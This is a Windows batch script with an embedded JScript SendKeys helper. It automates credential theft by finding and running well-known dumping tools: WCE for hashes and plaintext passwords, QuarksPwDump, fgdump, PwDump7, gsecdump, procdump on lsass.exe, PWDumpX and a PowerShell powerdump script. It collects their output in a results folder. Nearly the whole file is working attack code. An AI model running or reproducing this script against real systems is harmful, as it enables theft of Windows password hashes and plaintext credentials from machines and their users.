@if (@CodeSection == @Batch) @then
@echo off
SETLOCAL enabledelayedexpansion
cd /d %~dp0
rem Use %SendKeys%
set SendKeys=CScript //nologo //E:JScript "%~F0"
for /r "." %%a in (*.exe) do (
:: %%a is used as argument for "TYPEd"
echo This is iteration %%a
:: FIND /i : Specifies that the search is not case-sensitive.
ECHO.%%a| FIND /I "wce_v1_4beta_x32\wce.exe">Nul && (
  Echo Executing "WCE"
  echo "Dumping Hashes with WCE:" > "Results_Output\out_wce.txt" 2>&1
  start /wait "" /w /b "%%a" >> "Results_Output\out_wce.txt" 2>&1
  PING 1.2.1.1 -n 3 >NUL 2>&1
   net file %%a /close
  echo "Dumping plaintext password with WCE:" >> "Results_Output\out_wce.txt" 2>&1
   start /wait "" /w /b "%%a" -w >> "Results_Output\out_wce.txt" 2>&1
   PING 1.2.1.1 -n 2 >NUL 2>&1
   net file %%a /close
) || (
  Echo.
)

ECHO.%%a| FIND /I "QuarksPwDump.exe">Nul && (
  Echo Executing "QuarksPwDump.exe".
   start /wait "" /b "%%a" --dump-hash-local > "Results_Output\out_QuarksPwDump.txt" 2>&1
   PING 1.2.1.1 -n 3 >NUL 2>&1
   start /wait "" /b "%%a" --dump-hash-domain-cached >> "Results_Output\out_QuarksPwDump.txt" 2>&1
) || (
  Echo.
)

ECHO.%%a| FIND /I "lslsass32.exe">Nul && (
  Echo Executing "lslsass32.exe".
   start /wait "" /b "%%a" abc > "Results_Output\out_lslass.txt" 2>&1
   PING 1.2.1.1 -n 3 >NUL 2>&1
) || (
  Echo.
)

ECHO.%%a| FIND /I "fgdump.exe">Nul && (
  Echo Executing "FGDUMP"
  start /wait "" /w /b "%%~fa" > "Results_Output\out_fgdump.txt" 2>&1
  PING 1.2.1.1 -n 2 >NUL 2>&1
) || (
  Echo.
)
ECHO.%%a| FIND /I "PwDump7.exe">Nul && (
  Echo Executing "PwDump7"
  start /wait "" /w /b "%%~fa" > "Results_Output\out_pwdump7.txt" 2>&1
  PING 1.2.1.1 -n 2 >NUL 2>&1
) || (
  Echo.
)
ECHO.%%a| FIND /I "gsecdump-v2b5.exe">Nul && (
  Echo Executing "gsecdump-v2b5"
   start /wait "" /w /b "%%a" -a >> "Results_Output\out_gsecdump.txt" 2>&1
  PING 1.2.1.1 -n 2 >NUL 2>&1
) || (
  Echo.
)
ECHO.%%a| FIND /I "gsecdump.exe">Nul && (
  Echo Executing "gsecdump"
   start /wait "" /w /b "%%a" -a >> "Results_Output\out_gsecdump.txt" 2>&1
  PING 1.2.1.1 -n 2 >NUL 2>&1
) || (
  Echo.
)


ECHO.%%a| FIND /I "find_token.exe">Nul && (
  Echo Executing "find_token.exe". This tool is not appending output to file and it requires to run using CMD
   start /wait "" /b "%%a" 127.0.0.1 > Results_Output\out_find_token.txt 2>&1
   PING 1.2.1.1 -n 10 >NUL 2>&1
) || (
  Echo.
)
ECHO.%%a| FIND /I "procdump.exe">Nul && (
  Echo Executing "procdump.exe".
   start /wait "" /b "%%a"  -accepteula -ma lsass.exe "Results_Output\NewDump.dmp" 
   PING 1.2.1.1 -n 3 >NUL 2>&1
) || (
  Echo.
)
ECHO.%%a| FIND /I "PWDumpX.exe">Nul && (
  Echo Executing "PWDumpX.exe"
   start /wait "" /w /b "%%a"  "127.0.0.1 + +" > "Results_Output\out_PWDumpX.txt" 2>&1
  PING 1.2.1.1 -n 2 >NUL 2>&1
) || (
  Echo.
)
)



echo Dumping passwords with powerdump in out_testing.bat
Powershell.exe -executionpolicy remotesigned -File powerdump.ps1 > "Results_Output\out_powerdump.txt"
echo "A TERMINAT"
PAUSE
endlocal
goto :EOF

@end

// JScript section

var WshShell = WScript.CreateObject("WScript.Shell");
WshShell.SendKeys(WScript.Arguments(0));
